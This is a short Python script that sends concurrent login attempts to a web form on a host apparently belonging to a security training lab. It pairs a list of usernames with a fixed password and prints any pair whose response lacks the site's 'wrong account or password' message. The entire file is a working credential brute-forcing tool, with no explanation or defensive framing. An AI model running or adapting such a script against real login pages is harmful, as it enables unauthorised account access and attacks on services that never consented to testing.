import time

start_time = time.time()

from requests_html import AsyncHTMLSession, HTMLSession

asession = AsyncHTMLSession()
method = asession.post
proxies = {}

url = 'http://inject2.lab.aqlab.cn:81/Pass-08/index.php'
username = ['admin', 1, 2, 3, 4, 5, 6, 7, 8, 9, ]
password = ['123456'] * 10
data = {}
exclude = '账号密码错误'

functions = []


def download_method2(url, data):
    async def get_pythonorg(url=url, data=data):
        r = await method(url, proxies=proxies, data=data)
        if exclude not in r.text:
            print(data)

    return get_pythonorg


for u, p in zip(username, password):
    data = {'username': u, 'password': p}
    functions.append(download_method2(url, data))

# print(functions)
asession.run(*functions)
print("--- %s seconds ---" % (time.time() - start_time))
